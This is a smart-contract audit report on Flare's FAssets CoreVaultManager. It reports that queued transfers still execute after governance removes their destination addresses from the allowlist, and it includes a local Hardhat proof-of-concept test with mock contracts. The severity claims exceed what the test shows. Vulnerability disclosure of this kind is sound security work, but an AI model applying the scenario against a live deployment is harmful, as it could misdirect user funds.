# #47159 \[SC-Insight] Lack of Access Control on \`triggerInstructions()\` Allows Unauthorized Transfers Post-Deletion

**Submitted on Jun 9th 2025 at 09:43:25 UTC by @Pig46940 for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #47159
* **Report Type:** Smart Contract
* **Report severity:** Insight
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/implementation/CoreVaultManager.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield
  * Theft of unclaimed yield
  * Permanent freezing of funds
  * Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

The `CoreVaultManager` contract allows transfers to predefined destination addresses. However, due to insufficient access control logic during `triggerInstructions()`, later removed allowed addresses from the allowed list—yet still trigger the transfers. User or Agent can send funds to an unauthorized address and possibly vanish the funds.

## Vulnerability Details

### Root Cause

The function `triggerInstructions()` does not revalidate whether the destination addresses in queued transfer requests are still present in the allowed destination address list. As a result, once a request is added with an allowed address, it remains executable even if the address is later removed.

### Exploit Scenario

1. A privileged user adds `destinationAddress1` and `destinationAddress2` to the list of allowed destination addresses.
2. Transfer requests are created using `requestTransferFromCoreVault()` for those addresses.
3. The same user removes the addresses from the allowed list using `removeAllowedDestinationAddresses()`.
4. The function `triggerInstructions()` is called by user or agent, and executes the queued transfers to the now unauthorized destination addresses.

This violates the assumption that only currently allowed addresses should ever receive funds, potentially allowing malicious or unintended fund transfers.

## Impact Details

Transfers to removed destination addresses are executed, even when such addresses are no longer authorized. This enables:

* Griefing: Governance can’t cancel transfers even if the destination becomes invalid or compromised.
* Policy Bypass: Violates destination allowlist enforcement.
* Loss of Trust: Funds may be irreversibly sent to addresses that are no longer permitted.

## References

* [CoreVaultManager Contract](https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/implementation/CoreVaultManager.sol)

## Proof of Concept

## Proof of Concept

### Setup and run

```bash
$ cd fassets/test/unit/fasset/implementation
$ touch CoreVaultManagerDestinationBugTest.ts
$ vim # Paste PoC code
$ yarn hardhat test ./test/unit/fasset/implementation/CoreVaultManagerDestinationBugTest.ts
```

### PoC code

```typescript
import { expectEvent, expectRevert, time } from "@openzeppelin/test-helpers";
import {
  AddressUpdaterInstance,
  CoreVaultManagerInstance,
  CoreVaultManagerProxyInstance,
  GovernanceSettingsInstance,
  MockContractInstance,
} from "../../../../typechain-truffle";
import { GENESIS_GOVERNANCE_ADDRESS } from "../../../utils/constants";
import { getTestFile, loadFixtureCopyVars } from "../../../utils/test-helpers";
import { Payment } from "@flarenetwork/state-connector-protocol/dist/generated/types/typescript/Payment";
import { abiEncodeCall, erc165InterfaceId, ZERO_BYTES32 } from "../../../../lib/utils/helpers";
import { assertWeb3DeepEqual, assertWeb3Equal } from "../../../utils/web3assertions";
import { ZERO_ADDRESS } from "../../../../deployment/lib/deploy-utils";
import { ZERO_BYTES_32 } from "@flarenetwork/state-connector-protocol";

const CoreVaultManager = artifacts.require("CoreVaultManager");
const CoreVaultManagerProxy = artifacts.require("CoreVaultManagerProxy");
const GovernanceSettings = artifacts.require("GovernanceSettings");
const AddressUpdater = artifacts.require("AddressUpdater");
const MockContract = artifacts.require("MockContract");

contract(`CoreVaultManager.sol; ${getTestFile(__filename)}; Destination Address Deletion Vulnerability`, async (accounts) => {
  let coreVaultManager: CoreVaultManagerInstance;
  let coreVaultManagerProxy: CoreVaultManagerProxyInstance;
  let coreVaultManagerImplementation: CoreVaultManagerInstance;
  let addressUpdater: AddressUpdaterInstance;
  let fdcVerification: MockContractInstance;
  let governanceSettings: GovernanceSettingsInstance;
  const governance = accounts[1000];
  const assetManager = accounts[101];
  const triggererAccount = accounts[1];
  const chainId = web3.utils.keccak256("123");
  const standardPaymentReference = web3.utils.keccak256("standardPaymentReference");
  const custodianAddress = "custodianAddress";
  const coreVaultAddress = "coreVaultAddress";
  const DAY = 24 * 3600;

  async function initialize() {
    // create governance settings
    governanceSettings = await GovernanceSettings.new();
    await governanceSettings.initialise(governance, 60, [governance], {
      from: GENESIS_GOVERNANCE_ADDRESS,
    });
    // create address updater
    addressUpdater = await AddressUpdater.new(governance);
    // create core vault manager
    coreVaultManagerImplementation = await CoreVaultManager.new();
    coreVaultManagerProxy = await CoreVaultManagerProxy.new(
      coreVaultManagerImplementation.address,
      governanceSettings.address,
      governance,
      addressUpdater.address,
      assetManager,
      chainId,
      custodianAddress,
      coreVaultAddress,
      0
    );
    coreVaultManager = await CoreVaultManager.at(coreVaultManagerProxy.address);
    fdcVerification = await MockContract.new();
    await fdcVerification.givenAnyReturnBool(true);
    await addressUpdater.update(
      ["AddressUpdater", "FdcVerification"],
      [addressUpdater.address, fdcVerification.address],
      [coreVaultManager.address],
      { from: governance }
    );
    return { coreVaultManager };
  }

  beforeEach(async () => {
    ({ coreVaultManager } = await loadFixtureCopyVars(initialize));
  });

  describe("Destination Address Deletion Vulnerability with requestTransferFromCoreVault", async () => {
    const preimageHash1 = web3.utils.keccak256("hash1");
    const preimageHash2 = web3.utils.keccak256("hash2");
    const escrowTimeSeconds = 3600;
    const destinationAddress1 = "destinationAddress1";
    const destinationAddress2 = "destinationAddress2";
    const destinationAddress3 = "destinationAddress3";

    beforeEach(async () => {
      // add triggering accounts
      await coreVaultManager.addTriggeringAccounts([triggererAccount], {
        from: governance,
      });

      // settings
      await coreVaultManager.updateSettings(escrowTimeSeconds, 200, 300, 15, { from: governance });

      // add preimage hashes
      await coreVaultManager.addPreimageHashes([preimageHash1, preimageHash2], {
        from: governance,
      });

      // add allowed destination addresses
      await coreVaultManager.addAllowedDestinationAddresses(
        [destinationAddress1, destinationAddress2, destinationAddress3],
        { from: governance }
      );

      // current timestamp
      const currentTimestamp = await time.latest();
      const startOfNextDay = currentTimestamp.addn(DAY - currentTimestamp.modn(DAY));
      await time.increaseTo(startOfNextDay);
    });

    it("should prove vulnerability: triggerInstructions works after destination address deletion with non-cancelable requests", async () => {
      console.log("===== STEP 1: Initial Setup =====");

      // Setup: Fund the vault
      const transactionId = web3.utils.keccak256("transactionId");
      const initialAmount = 10000;
      const proof = createPaymentProof(transactionId, initialAmount);
      await coreVaultManager.confirmPayment(proof);

      let availableFunds = await coreVaultManager.availableFunds();
      console.log("Initial availableFunds:", availableFunds.toString());

      // Verify destination addresses are allowed
      const allowedAddressesBefore = await coreVaultManager.getAllowedDestinationAddresses();
      console.log("Allowed destination addresses before:", allowedAddressesBefore);
      console.log("destinationAddress1 allowed:", allowedAddressesBefore.includes(destinationAddress1));
      console.log("destinationAddress2 allowed:", allowedAddressesBefore.includes(destinationAddress2));

      console.log("===== STEP 2: Create Non-Cancelable Transfer Requests =====");

      // Create non-cancelable transfer requests using requestTransferFromCoreVault
      const transferAmount1 = 1000;
      const transferAmount2 = 1500;
      const paymentRef1 = web3.utils.keccak256("paymentRef1");
      const paymentRef2 = web3.utils.keccak256("paymentRef2");

      // Create first non-cancelable transfer request
      await coreVaultManager.requestTransferFromCoreVault(
        destinationAddress1,
        paymentRef1,
        transferAmount1,
        false, // non-cancelable
        { from: assetManager }
      );
      console.log(`Created non-cancelable transfer request: ${transferAmount1} to ${destinationAddress1}`);

      // Create second non-cancelable transfer request
      await coreVaultManager.requestTransferFromCoreVault(
        destinationAddress2,
        paymentRef2,
        transferAmount2,
        false, // non-cancelable
        { from: assetManager }
      );
      console.log(`Created non-cancelable transfer request: ${transferAmount2} to ${destinationAddress2}`);

      // Verify transfer requests were created
      const nonCancelableRequests = await coreVaultManager.getNonCancelableTransferRequests();
      console.log("Non-cancelable transfer requests created:", nonCancelableRequests.length);
      for (let i = 0; i < nonCancelableRequests.length; i++) {
        console.log(`Request ${i}: ${nonCancelableRequests[i].amount} to ${nonCancelableRequests[i].destinationAddress}`);
      }

      console.log("===== STEP 3: VULNERABILITY - Remove Destination Addresses =====");

      // NOW THE VULNERABILITY: Remove destination addresses after transfer requests are created
      await coreVaultManager.removeAllowedDestinationAddresses(
        [destinationAddress1, destinationAddress2],
        { from: governance }
      );

      // Verify addresses are now removed
      const allowedAddressesAfter = await coreVaultManager.getAllowedDestinationAddresses();
      console.log("Allowed destination addresses after removal:", allowedAddressesAfter);
      console.log("destinationAddress1 allowed after removal:", allowedAddressesAfter.includes(destinationAddress1));
      console.log("destinationAddress2 allowed after removal:", allowedAddressesAfter.includes(destinationAddress2));

      console.log("===== STEP 4: THE BUG - triggerInstructions still works! =====");

      // Check funds before triggering
      const fundsBeforeTrigger = await coreVaultManager.availableFunds();
      console.log("Available funds before triggerInstructions:", fundsBeforeTrigger.toString());


      // This should fail because destination addresses are no longer allowed
      // But due to the vulnerability, it will succeed
      const result = await coreVaultManager.triggerInstructions({ from: triggererAccount });

      console.log("===== VULNERABILITY CONFIRMED =====");
      console.log("triggerInstructions succeeded even though destination addresses were removed!");
      console.log("Transaction result:", result.tx);

      // Check if PaymentInstructions events were emitted (proving transfers were processed)
      const paymentEvents = result.logs.filter(log => log.event === 'PaymentInstructions');
      console.log("PaymentInstructions events emitted:", paymentEvents.length);

      // Show the state after the unauthorized execution
      const finalAvailableFunds = await coreVaultManager.availableFunds();
      const finalEscrowedFunds = await coreVaultManager.escrowedFunds();
      console.log("Final availableFunds:", finalAvailableFunds.toString());
      console.log("Final escrowedFunds:", finalEscrowedFunds.toString());

      // Check remaining transfer requests
      const remainingRequests = await coreVaultManager.getNonCancelableTransferRequests();
      console.log("Remaining non-cancelable requests:", remainingRequests.length);

      // This test proves the vulnerability exists
      assert.fail(
        "VULNERABILITY CONFIRMED: triggerInstructions executed transfers to unauthorized destination addresses!"
      );

    });



  });

  function createPaymentProof(
    _transactionId: string,
    _amount: number,
    _status = "0",
    _chainId = chainId,
    _receivingAddressHash = web3.utils.keccak256(coreVaultAddress),
    _standardPaymentReference = standardPaymentReference
  ): Payment.Proof {
    const requestBody: Payment.RequestBody = {
      transactionId: _transactionId,
      inUtxo: "0",
      utxo: "0",
    };
    const responseBody: Payment.ResponseBody = {
      blockNumber: "0",
      blockTimestamp: "0",
      sourceAddressHash: ZERO_BYTES32,
      sourceAddressesRoot: ZERO_BYTES32,
      receivingAddressHash: _receivingAddressHash,
      intendedReceivingAddressHash: _receivingAddressHash,
      standardPaymentReference: _standardPaymentReference,
      spentAmount: "0",
      intendedSpentAmount: "0",
      receivedAmount: String(_amount),
      intendedReceivedAmount: String(_amount),
      oneToOne: false,
      status: _status,
    };

    const response: Payment.Response = {
      attestationType: Payment.TYPE,
      sourceId: _chainId,
      votingRound: "0",
      lowestUsedTimestamp: "0",
      requestBody: requestBody,
      responseBody: responseBody,
    };

    const proof: Payment.Proof = {
      merkleProof: [],
      data: response,
    };

    return proof;
  }
});
```
